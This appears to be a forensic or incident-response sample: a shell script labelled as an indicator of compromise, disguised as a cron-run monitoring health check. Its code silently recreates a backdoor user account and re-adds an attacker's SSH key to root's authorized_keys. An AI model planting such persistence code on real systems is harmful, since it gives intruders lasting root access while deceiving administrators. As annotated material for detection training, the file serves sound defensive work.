#!/bin/sh
# IOC:PERSISTENCE-SCRIPT -- disguised as a routine monitoring/health-check
# script (hence the innocuous name). Its real job, run every 5 minutes by
# /etc/cron.d/sysmon-check, is to silently re-establish the attacker's
# access if either the backdoor account or the SSH key has been removed --
# a self-healing persistence mechanism.
echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) sysmon-check: verifying monitoring agent state"

id svc-monitor >/dev/null 2>&1 || useradd -m -s /bin/bash svc-monitor

mkdir -p /root/.ssh
grep -q 'mallory@c2' /root/.ssh/authorized_keys 2>/dev/null || \
    echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9x7z2example_planted_key mallory@c2' >> /root/.ssh/authorized_keys
